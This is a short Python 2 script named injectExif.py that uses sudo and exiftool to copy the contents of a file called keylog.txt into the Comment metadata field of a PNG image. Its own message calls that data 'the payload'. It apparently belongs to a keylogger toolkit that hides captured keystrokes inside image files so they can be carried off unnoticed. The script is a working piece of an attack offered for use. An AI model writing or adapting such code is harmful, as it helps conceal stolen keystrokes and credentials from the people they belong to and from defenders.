# -*- coding: utf-8 -*-
# injectExif.py
import os

PATH = "../images/IMG_0005.PNG"
FILESIZE = ""

try:
    FILESIZE = str(os.path.getsize(PATH))
    cmd = 'sudo exiftool "-Comment<=keylog.txt" ' + PATH + ' > /dev/null'
    #os.system(cmd).write("mizushima4105")
    os.system(cmd)
    print "[+] %s size: %s" % (PATH, FILESIZE)
except:
    print "[+] Failed to write the payload to the comment section of the exif file."
